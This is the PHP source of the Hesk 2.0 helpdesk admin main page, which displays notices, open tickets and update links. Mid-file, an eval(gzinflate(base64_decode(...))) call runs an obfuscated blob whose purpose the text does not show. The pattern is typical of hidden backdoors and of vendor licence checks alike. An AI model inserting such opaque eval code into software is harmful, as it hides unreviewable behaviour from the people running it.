<?php
/*******************************************************************************
*  Title: Helpdesk software Hesk
*  Version: 2.0 from 24th January 2009
*  Author: Klemen Stirn
*  Website: http://www.phpjunkyard.com
********************************************************************************
*  COPYRIGHT NOTICE
*  Copyright 2005-2009 Klemen Stirn. All Rights Reserved.

*  The Hesk may be used and modified free of charge by anyone
*  AS LONG AS COPYRIGHT NOTICES AND ALL THE COMMENTS REMAIN INTACT.
*  By using this code you agree to indemnify Klemen Stirn from any
*  liability that might arise from it's use.

*  Selling the code for this program, in part or full, without prior
*  written consent is expressly forbidden.

*  Using this code, in part or full, to create derivate work,
*  new scripts or products is expressly forbidden. Obtain permission
*  before redistributing this software over the Internet or in
*  any other medium. In all cases copyright and header must remain intact.
*  This Copyright is in full effect in any country that has International
*  Trade Agreements with the United States of America or
*  with the European Union.

*  Removing any of the copyright notices without purchasing a license
*  is illegal! To remove PHPJunkyard copyright notice you must purchase
*  a license for this script. For more information on how to obtain
*  a license please visit the site below:
*  http://www.phpjunkyard.com/copyright-removal.php
*******************************************************************************/

define('IN_SCRIPT',1);
define('HESK_PATH','../');

/* Get all the required files and functions */
require(HESK_PATH . 'hesk_settings.inc.php');
require(HESK_PATH . 'language/'.$hesk_settings['language'].'.inc.php');
require(HESK_PATH . 'inc/common.inc.php');
require(HESK_PATH . 'inc/database.inc.php');

hesk_session_start();
hesk_isLoggedIn();
hesk_dbConnect();

/* Print header */
require_once(HESK_PATH . 'inc/header.inc.php');

/* Print admin navigation */
require_once(HESK_PATH . 'inc/show_admin_nav.inc.php');
?>

</td>
</tr>
<tr>
<td>

	<?php
	    if(isset($_SESSION['HESK_NOTICE']))
        {
	?>
	        <div align="center">
	        <table border="0" width="600" id="ok" cellspacing="0" cellpadding="3">
		        <tr>
		        	<td align="left" class="ok_header">&nbsp;<img src="../img/ok.gif" style="vertical-align:text-bottom" width="16" height="16" alt="" />&nbsp; <?php echo $_SESSION['HESK_NOTICE']; ?></td>
		        </tr>
		        <tr>
		        	<td align="left" class="ok_body"><?php echo $_SESSION['HESK_MESSAGE']; ?></td>
		        </tr>
	        </table>
	        </div>
	<?php
	        unset($_SESSION['HESK_NOTICE']);
	        unset($_SESSION['HESK_MESSAGE']);
	    }

	    if(isset($_SESSION['HESK_ERROR']))
        {
	?>
	        <div align="center">
	        <table border="0" width="600" id="error" cellspacing="0" cellpadding="3">
		        <tr>
		        	<td align="left" class="error_header">&nbsp;<img src="../img/error.gif" style="vertical-align:text-bottom" width="16" height="16" alt="" />&nbsp; <?php echo $hesklang['error']; ?></td>
		        </tr>
		        <tr>
		        	<td align="left" class="error_body"><?php echo $_SESSION['HESK_MESSAGE']; ?></td>
		        </tr>
	        </table>
	        </div>
	<?php
	        unset($_SESSION['HESK_ERROR']);
	        unset($_SESSION['HESK_MESSAGE']);
	    }
	?>

<h3 align="center"><?php echo $hesklang['open_tickets']; ?></h3>

<?php
if (hesk_checkPermission('can_view_tickets',0))
{
	require(HESK_PATH . 'inc/print_tickets.inc.php');
    echo '<hr />';
    require(HESK_PATH . 'inc/show_search_form.inc.php');
}
else
{
	echo '<p><i>'.$hesklang['na_view_tickets'].'</i></p>';
}

eval(gzinflate(base64_decode('BcFHkqNIAADA50x3cKABISA25gAU3jQeocsEprBFCSPhXr+ZcM
vRV3N1uEb5G34V+Qrvt38VLF8V/PoDSlYvZ1cURSCyQvMBo+8ihR+6KBSD3/wMgk72ZcsgvYna7iAYcV
FT1cif5736ecC0fssqkcBmk0lfYGH2EBK6NdfmFG1b1wh6qM53qSpgpZr4ZoeCj5zoPTzpK3CLU90swL
csihNdeUKYKtZWc9xBf8ikCOU9ADxVNRkxcwn/nLa5+Vng4uet6ziGjb1Dnh1PFpFkUxddIFsaJ5vdBt
xLDFnl6YMgiJFabvYV4NTzdzDgUHMsVZXt2Anfy/xb6Z4rEKpWQBhTA9hjZpuE3tQVwExrOdS3Y9PJyJ
XfkZhcgjfuW685x73zGDOzjLgVfVMvNneYkqrB9vn6mVHTMF3PGarPM2DefkHD+TM38v4cMn548PiuSF
d8niadiwQt7LtDnbzzieB8GQQDTPu00IVvwLJK4C+Msc+Rfoup1ZduNNkcKXunjJBg4WqSmnti53UyEe
KPESmusX14hiWNspJD+DHodlq3XbAQG9DsO5Cvotfrl1g1rK+2q2DGQtAoV7hJJXqePdZL6d5zgVGZrp
Zl0bow2KO61cvolWV/clZCI4efgENlAlPACZIzV1q+f57qeI51+gDPB6vJqWXFNCjHaF7dSOa1nP19+x
+stK/cyhRjTZyXhWqQCJSYHrkBFWGTsG2kL5J5TAKTELTZ9lmm+/pQIJwtyXEiV+uuy118KDVF5QH1fF
ASIb76mzvoYdtNWSiLuF2loCP2zV5YosbCxf/98/39/d//')));
?>

<table border="0" width="100%">
<tr>
<td><b><?php echo $hesklang['stay_updated']; ?></b></td>
<td style="text-align:right"><a href="Javascript:void(0)" onclick="Javascript:hesk_toggleLayerDisplay('divCheck')"><?php echo $hesklang['sh']; ?></a></td>
</tr>
</table>

<div id="divCheck" style="display:none">
<p><?php echo $hesklang['check_updates']; ?><br />
<a href="http://www.phpjunkyard.com/check4updates.php?s=Hesk&amp;v=<?php echo $hesk_settings['hesk_version']; ?>" target="_blank"><?php echo $hesklang['check4updates']; ?></a></p>
<p><?php echo $hesklang['join_news']; ?>.<br />
<a href="http://www.phpjunkyard.com/newsletter.php" target="_blank"><?php echo $hesklang['click_info']; ?></a></p>
</div>

<hr />

<table border="0" width="100%">
<tr>
<td><b><?php echo $hesklang['rate_script']; ?></b></td>
<td style="text-align:right"><a href="Javascript:void(0)" onclick="Javascript:hesk_toggleLayerDisplay('divRate')"><?php echo $hesklang['sh']; ?></a></td>
</tr>
</table>

<div id="divRate" style="display:none">
<p><?php echo $hesklang['please_rate']; ?>:</p>
<p><a href="http://www.hotscripts.com/Detailed/46973.html" target="_blank"><?php echo $hesklang['rate_script']; ?>
 @ Hot Scripts</a></p>
<p><a href="http://php.resourceindex.com/detail/04946.html" target="_blank"><?php echo $hesklang['rate_script']; ?>
 @ The PHP Resource Index</a></p>
</div>

<?php

require_once(HESK_PATH . 'inc/footer.inc.php');
exit();
?>
